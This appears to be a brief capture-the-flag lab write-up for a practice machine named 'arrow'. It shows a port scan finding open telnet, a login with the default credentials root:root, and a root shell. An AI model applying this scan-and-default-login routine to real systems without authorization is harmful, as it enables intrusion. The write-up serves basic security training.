## Description
```Description
Telnet (Telecommunication Network) is a protocol used for accessing remote computers over the internet. It provides a text-based interface for users to communicate with and control another machine, but lacks encryption, making it less secure.  
  
Recommended for practicing the basics of the Telnet service.
```

## IP-Address
```bash
172.20.2.87
```
## RustScan
```bash
rustscan -a 172.20.2.87  -b 450 -t 2000 --ulimit 5000 -- -e tun0 -Pn
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
```

## Telnet
```bash
telnet 172.20.2.87 23
Trying 172.20.2.87...
Connected to 172.20.2.87.
Escape character is '^]'.
Hey you, you're trying to connect to me.
You should always try default credentials like root:root
arrow Login: root
Password: root
As mentioned in the above control 
```

Got the Root
```bash
root@arrow:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# END
